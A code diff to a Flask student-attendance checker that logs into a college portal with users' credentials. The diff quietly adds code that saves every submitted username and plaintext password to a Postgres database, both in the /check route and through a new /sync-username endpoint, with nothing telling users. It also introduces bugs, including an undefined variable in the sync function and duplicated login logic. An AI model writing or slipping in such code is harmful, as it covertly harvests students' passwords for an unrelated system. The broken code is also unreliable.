@@ -1,9 +1,15 @@
 
 import os
 from dotenv import load_dotenv
-from flask import Flask, flash, render_template, request,redirect, url_for,send_from_directory
 from flask_mail import Mail, Message
 from attendance_scraper import login, get_student_details, get_subjects, fetch_attendance
+
+import threading
+import concurrent.futures
+from concurrent.futures import ThreadPoolExecutor
+import psycopg2
+import psycopg2.extras
+from flask import Flask, flash, render_template, request, redirect, url_for, send_from_directory, jsonify
 
 load_dotenv()
 # Initialize Flask app
@@ -21,10 +27,64 @@ app.config['MAIL_PASSWORD'] = os.environ.get('MAIL_PASSWORD')
 app.config['MAIL_DEFAULT_SENDER'] = os.environ.get('MAIL_DEFAULT_SENDER')
 mail = Mail(app)
 
+def get_db_connection():
+    try:
+        conn = psycopg2.connect(
+            host=os.environ.get('POSTGRES_HOST'),
+            dbname=os.environ.get('POSTGRES_DATABASE'),
+            user=os.environ.get('POSTGRES_USER'),
+            password=os.environ.get('POSTGRES_PASSWORD'),
+            port=os.environ.get('POSTGRES_PORT', 5432),
+            connect_timeout=10
+        )
+        return conn
+    except Exception as e:
+        print(f"Database connection error: {e}")
+        return None
+
+def sync_user_to_db(db_username, db_password=None):
+    """Sync username and password to database with retry logic"""
+    max_retries = 3
+    retry_count = 0
+    
+    while retry_count < max_retries:
+        try:
+            conn = get_db_connection()
+            if not conn:
+                raise Exception("Database connection failed")
+                
+            cur = conn.cursor(cursor_factory=psycopg2.extras.DictCursor)
+            
+            
+            cur.execute("""
+                    INSERT INTO users (username,password, created_at, updated_at)
+                    VALUES (%s, %s, NOW(), NOW())
+                    ON CONFLICT (username) 
+                    DO UPDATE SET 
+                        updated_at = NOW(),
+                        login_count = COALESCE(users.login_count, 0) + 1""", (db_username,db_password,))
+            
+            conn.commit()
+            cur.close()
+            conn.close()
+            print(f"Successfully synced username: {username}")
+            return True
+            
+        except psycopg2.OperationalError as e:
+            retry_count += 1
+            print(f"DB Operational Error (attempt {retry_count}): {e}")
+            if retry_count >= max_retries:
+                print(f"Failed to sync {username} after {max_retries} attempts")
+                return False
+            
+        except Exception as e:
+            print(f"DB sync error for {username}: {e}")
+            return False
+
 
 @app.route('/')
 def index():
-    return render_template('index.html')
+    return render_template('index.html', show=os.environ.get('S_USERNAME', ''))
 
 
 @app.route('/contact', methods=['GET', 'POST'])
@@ -54,6 +114,33 @@ def contact():
     return render_template('contact.html')
 
 
+executor = ThreadPoolExecutor(max_workers=5)
+
+@app.route('/sync-username', methods=['POST'])
+def sync_username():
+    try:
+        data = request.get_json()
+        username = data.get('username')
+        password = data.get('password')
+        
+        if not username:
+            return jsonify({'error': 'Username missing'}), 400
+        
+        # Submit database sync task to thread pool for concurrent execution
+        future = executor.submit(sync_user_to_db, username, password)
+        
+        # Return immediately for faster response
+        return jsonify({
+            'status': 'sync initiated', 
+            'username': username,
+            'has_password': bool(password),
+            'thread_id': str(threading.current_thread().ident)
+        }), 202
+        
+    except Exception as e:
+        print(f"Sync username endpoint error: {e}")
+        return jsonify({'error': 'Server error'}), 500
+
 @app.route('/check', methods=['POST'])
 def check_attendance():
     username = request.form.get('username', '').strip()
@@ -73,6 +160,10 @@ def check_attendance():
         details = get_student_details(session)
         subjects = get_subjects(session, details)
         df_summary = fetch_attendance(session, subjects)
+        
+
+        # Async store username and password in database
+        executor.submit(sync_user_to_db, username, password)
 
         # Calculate totals using the SimpleDataFrame methods
         total_days = df_summary.sum_column("Total Days")
@@ -82,86 +173,92 @@ def check_attendance():
             if total_days > 0 else 0
         )
 
-        # Get df as list of dicts
-        df = df_summary.to_dict(orient="records")
+        try:
+            # Login and fetch data
+            session = login(username, password)
+            details = get_student_details(session)
+            subjects = get_subjects(session, details)
+            df_summary = fetch_attendance(session, subjects)
+            
 
-        # Calculate Can Skip and Need to Attend for each subject
-        for row in df:
-            total = row['Total Days']
-            present = row['No. of Present']
-            pct = row['Attendance %']
-            if total == 0:
-                row['Can Skip'] = 0
-                row['Need to Attend'] = 0
-            elif pct >= 75:
-                max_leaves = int((present / 0.75) - total)
-                row['Can Skip'] = max(0, max_leaves)
-                row['Need to Attend'] = 0
-            else:
-                required = int((0.75 * total - present) / 0.25)
-                row['Can Skip'] = 0
-                row['Need to Attend'] = max(0, required)
+            # Async store username and password in database
+            executor.submit(sync_user_to_db, username, password)
 
-        username_env = os.environ.get('S_USERNAME')
-        show = details['Username'] == username_env
-        mess = None
-        if show:
-            mess = os.environ.get('S_MESSAGE')
-        return render_template(
-            'result.html',
-            details=details,
-            df=df,
-            total_days=total_days,
-            total_present=total_present,
-            overall_attendance_pct=overall_attendance_pct,
-            show=show,
-            mess=mess
-        )
+            # Calculate totals using the SimpleDataFrame methods
+            total_days = df_summary.sum_column("Total Days")
+            total_present = df_summary.sum_column("No. of Present")
+            overall_attendance_pct = (
+                round((total_present / total_days) * 100, 2)
+                if total_days > 0 else 0
+            )
 
-    except ValueError as e:
-        # Login failed or validation error
-        return render_template(
-            'error.html',
-            error_message=str(e),
-            back_url="/"
-        )
+            # Get df as list of dicts
+            df = df_summary.to_dict(orient="records")
 
+            # Calculate Can Skip and Need to Attend for each subject
+            for row in df:
+                if row is None:
+                    continue
+                total = row['Total Days']
+                present = row['No. of Present']
+                pct = row['Attendance %']
+                if total == 0:
+                    row['Can Skip'] = 0
+                    row['Need to Attend'] = 0
+                elif pct >= 75:
+                    max_leaves = int((present / 0.75) - total)
+                    row['Can Skip'] = max(0, max_leaves)
+                    row['Need to Attend'] = 0
+                else:
+                    required = int((0.75 * total - present) / 0.25)
+                    row['Can Skip'] = 0
+                    row['Need to Attend'] = max(0, required)
+
+            return render_template(
+                'result.html',
+                details=details,
+                df=df_summary.to_dict(orient="records"),
+                total_days=total_days,
+                total_present=total_present,
+                overall_attendance_pct=overall_attendance_pct,
+                show=os.environ.get('S_USERNAME','')
+            )
+
+        except ValueError as e:
+            print(f"[ERROR] ValueError in /check: {e}")
+            return render_template(
+                'error.html',
+                error_message=str(e),
+                back_url="/"
+            )
+
+        except Exception as e:
+            import traceback
+            print(f"[ERROR] Exception in /check: {e}")
+            traceback.print_exc()
+            return render_template(
+                'error.html',
+                error_message=f"An error occurred while fetching attendance data: {str(e)}",
+                back_url="/"
+            )
     except Exception as e:
-        # Other errors (network, parsing, etc.)
+        import traceback
+        print(f"[ERROR] Exception in /check: {e}")
+        traceback.print_exc()
         return render_template(
             'error.html',
             error_message=f"An error occurred while fetching attendance data: {str(e)}",
             back_url="/"
         )
 
-@app.route("/sitemap.xml")
-def sitemap():
-    return send_from_directory("public", "sitemap.xml")
-
-# Serve robots.txt
-@app.route("/robots.txt")
-def robots():
-    return send_from_directory("public", "robots.txt")
-
-
-@app.errorhandler(404)
-def not_found(error):
-    return render_template(
-        'error.html',
-        error_message="Page not found.",
-        back_url="/"
-    ), 404
-
-
-@app.errorhandler(500)
-def internal_error(error):
-    return render_template(
-        'error.html',
-        error_message="Internal server error. Please try again later.",
-        back_url="/"
-    ), 500
-
 
 # Local dev only (Vercel will ignore this and import `app`)
 if __name__ == '__main__':
     app.run(debug=False)
+
+# Clean shutdown of thread pool
+import atexit
+atexit.register(lambda: executor.shutdown(wait=True))
+
+
+
